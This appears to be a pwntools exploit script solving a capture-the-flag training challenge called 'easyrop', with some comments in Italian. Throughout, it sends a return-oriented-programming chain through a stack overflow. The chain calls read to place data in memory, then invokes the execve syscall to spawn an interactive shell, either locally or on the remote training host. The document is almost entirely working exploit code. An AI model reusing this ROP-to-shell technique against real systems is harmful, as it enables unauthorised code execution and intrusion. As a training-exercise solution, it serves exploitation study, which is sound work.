from pwn import *

#Breakpoints:
# 4010d7 -> prima read
# 401101 -> seconda read
# 401134 -> scrittura nell'array
# 40114c -> write in output

COMMANDS2 = """
b main
b *0x000000000040114c
c
"""

chall_path = "./easyrop"

if args.REMOTE:
    c = remote("easyrop.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(chall_path, gdbscript=COMMANDS2)
    else:
        c = process(chall_path)

for x in range(0, 30, 1):
    input("waiting input for A:")
    c.send(b"\x00\x00\x00\x00")

    input("waiting input for B:")
    c.send(b"\x00\x00\x00\x00")

    if( x == 13 ):

        input("first gadget address to prepare read:")                  
        c.send(b"\x8e\x10\x40\x00\x00\x00\x00\x00")         #indirizzo del gadget
        c.send(p64(0))
        input("prepare rdi on the stack to be popped:")
        c.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
        c.send(p64(0))
        input("prepare rsi on the stack:")
        c.send(b"\x00\x30\x40\x00\x00\x00\x00\x00") 
        c.send(p64(0))
        input("prepare rdx on the stack:")
        c.send(b"\x07\x00\x00\x00\x00\x00\x00\x00")
        c.send(p64(0))
        input("prepare rax on the stack:")
        c.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
        c.send(p64(0))
        input("read function address:")                     #perform the read
        c.send(b"\x00\x10\x40\x00\x00\x00\x00\x00") 
        c.send(p64(0))
        input("first gadget address to prepare execve:")    #fake saved rip of the read is again the same gadget              
        c.send(b"\x8e\x10\x40\x00\x00\x00\x00\x00")         #indirizzo del gadget
        c.send(p64(0))
        input("prepare rdi on the stack:")
        c.send(b"\x00\x30\x40\x00\x00\x00\x00\x00") 
        c.send(p64(0))
        input("prepare rsi on the stack:")
        c.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
        c.send(p64(0))
        input("prepare rdx on the stack:")
        c.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
        c.send(p64(0))
        input("prepare rax on the stack:")
        c.send(b"\x3b\x00\x00\x00\x00\x00\x00\x00")
        c.send(p64(0))
        input("execve syscall:")
        c.send(b"\x28\x10\x40\x00\x00\x00\x00\x00")
        c.send(p64(0))
        break

c.interactive()